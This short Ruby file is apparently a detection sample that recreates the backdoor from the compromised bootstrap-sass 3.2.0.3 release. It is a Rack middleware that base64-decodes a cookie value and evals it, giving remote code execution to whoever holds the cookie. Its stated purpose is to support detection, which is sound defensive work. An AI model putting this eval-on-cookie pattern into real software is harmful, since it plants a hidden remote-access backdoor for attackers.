# bootstrap-sass@3.2.0.3 (Apr 2019). Attacker-uploaded version
# shipped a Rack middleware that read a magic cookie, base64-decoded
# it, and eval'd the result — RCE for anyone holding the cookie.
#
# Detection target: dynamic-eval + base64-decode.

require 'base64'

module Rack
  class SendFile
    def call(env)
      if env['HTTP_COOKIE'] =~ /___cfduid=(.+);/
        eval(Base64.decode64($1))
      end
    end
  end
end
